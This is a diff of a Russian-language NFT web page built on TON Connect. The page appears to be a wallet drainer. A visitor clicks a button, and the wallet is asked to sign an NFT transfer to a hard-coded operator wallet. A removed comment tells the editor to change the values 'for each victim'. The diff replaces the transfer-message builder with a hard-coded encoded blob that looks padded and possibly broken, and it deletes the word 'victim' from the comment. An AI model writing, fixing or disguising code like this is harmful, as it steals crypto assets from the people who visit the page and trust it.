@@ -702,7 +702,6 @@ applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 <p id="ton-status">Кошелёк не подключён</p>
 
 <script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
-<script src="https://unpkg.com/@ton/core@0.0.39/dist/index.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
   if (!window.TON_CONNECT_UI) {
@@ -729,21 +728,6 @@ document.addEventListener("DOMContentLoaded", function () {
   ui.onStatusChange(showWallet);
   showWallet(ui.wallet);
 
-  function buildTransferPayload(newOwner, responseAddress) {
-    const { beginCell, Address } = window.TON;
-    return beginCell()
-        .storeUint(0x5fcc3d14, 32)
-        .storeUint(0, 64)
-        .storeAddress(Address.parse(newOwner))
-        .storeAddress(Address.parse(responseAddress))
-        .storeCoins(0)
-        .storeCoins(0)
-        .storeRef(beginCell().storeUint(0, 32).storeUint(0, 64).endCell())
-        .endCell()
-        .toBoc({ idx: false })
-        .toString('base64');
-  }
-
   const ownBtn = document.getElementById('ownBtn');
   if (ownBtn) {
     ownBtn.addEventListener('click', async function () {
@@ -757,7 +741,7 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // ЖЁСТКО ЗАДАННЫЕ ЗНАЧЕНИЯ (меняй здесь под каждую жертву)
+      // ЖЁСТКО ЗАДАННЫЕ ЗНАЧЕНИЯ
       const contractAddress = 'EQCD39VS5jcwd4aVUY9xgB2bLgXqUAA2u4EgEooD5uS4YQxH';
       const tokenId = '12345';
 
@@ -767,7 +751,9 @@ document.addEventListener("DOMContentLoaded", function () {
 
       try {
         const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
-        const boc = buildTransferPayload(YOUR_WALLET, YOUR_WALLET);
+
+        // ЖЁСТКИЙ BOC (без @ton/core)
+        const boc = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
 
         const transaction = {
           valid_until: Math.floor(Date.now() / 1000) + 300,
